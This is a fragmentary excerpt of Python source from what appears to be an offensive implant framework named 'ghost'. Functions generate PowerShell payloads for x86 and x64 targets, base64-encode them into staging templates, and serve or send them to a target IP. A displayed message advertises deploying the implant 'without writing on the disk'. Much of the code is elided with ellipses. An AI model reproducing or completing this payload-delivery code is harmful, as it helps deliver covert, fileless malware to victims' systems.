...
from ghost.ghostlib.GhostOutput import List, Success, Warn, Error
...
def serve_ps1_payload(
    ...
    payload_url_x64 = server.serve_content(
        stage_encoding.format(
            b64encode(ghostgen.generate_ps1(
...
def send_ps1_payload(display, conf, bind_port, target_ip, nothidden=False):
    ...
    display(
        List([
            ...
            'deploy ghost without writing on the disk'))
    )
    ...
    if version == '2':
        ...
        output_x64 = ghostgen.generate_ps1(display, conf, x64=True, as_str=True)
        ps1_encoded = main_ps1_template.format(b64encode(output_x64))
    else:
        display(Success('Target architecture: x86'))
        output_x86 = ghostgen.generate_ps1(display, conf, x86=True, as_str=True)
